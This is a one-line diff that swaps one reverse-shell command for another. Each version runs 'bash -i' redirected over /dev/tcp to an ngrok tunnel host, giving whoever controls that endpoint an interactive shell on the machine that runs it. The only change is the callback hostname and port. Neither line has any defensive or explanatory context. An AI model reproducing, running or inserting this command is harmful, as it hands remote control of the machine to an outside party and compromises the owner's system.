@@ -1,1 +1,1 @@
-bash -c 'echo "user: $(whoami)"; bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/10040 0>&1'
+bash -c 'echo "user: $(whoami)"; bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/12764 0>&1'
